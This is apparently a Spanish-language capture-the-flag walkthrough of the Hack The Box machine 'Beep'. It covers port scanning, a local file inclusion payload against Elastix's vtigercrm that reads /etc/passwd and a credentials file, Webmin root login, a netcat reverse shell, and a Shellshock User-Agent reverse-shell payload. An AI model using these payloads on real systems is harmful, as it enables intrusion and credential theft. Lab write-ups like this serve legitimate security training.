# Hack The Box - Beep


## Exploración

Todos los puertos, rapido y silencioso
<pre>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts
</pre>
 
Puertos especificos
<pre>
nmap -sCV -p22,25,80,110,111,143,443,881,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7 -oN targeted

## Acceso

Como sale el puerto 80 comprobamos por el navegador y nos redirige a una Web de login con **elastix*-

Buscamos en searchesploy:
<pre>
	searchsploit elastix
</pre>

Vemos que hay opciones de File inclusion:
<pre>
searchsploit -x php/webapps/37637.pl
</pre>

Vemos hay hay un bug:
<pre>
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
</pre>

Hacemos una prueba en el navegador para traernos el /etc/passwd:
<pre>
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
</pre>

La primera opción devuelve un fichero con credenciales:
<pre>
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
</pre>


Vemos en el targeted que hay un WebMin en el puerto 10000. Podemos entrar como  root y la credencial encontrada.

Podemos ir bajo Other Command Shell y ejecutar  una reverse shield. Previamente nos ponemos a la escucha.

<pre>
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 443 >/tmp/f
</pre>

Entramos como root. Podemos ver las flags. 

Hay que configurar la consola.


## Otra manera: *ShellInjection* a cgi

Con bursuite
<pre>
UserAgent: () { :; } /bin/bash - i >& /dev/tcp/10.10.14.54/443 0>&1
</pre>

## Consola

No me ha funcionado. S4vitar utiliza el cambio de imagen de la empresa para crear una php.

<pre>
CTLR + Z
stty raw -echo; fg
reset
export TERM=xterm
export shell=bash
stty rows 51 columns 189
</pre>



## busqueda de flags
<pre>
find \-name user.txt | xargs cat
find \-name root.txt | xargs cat
</pre>
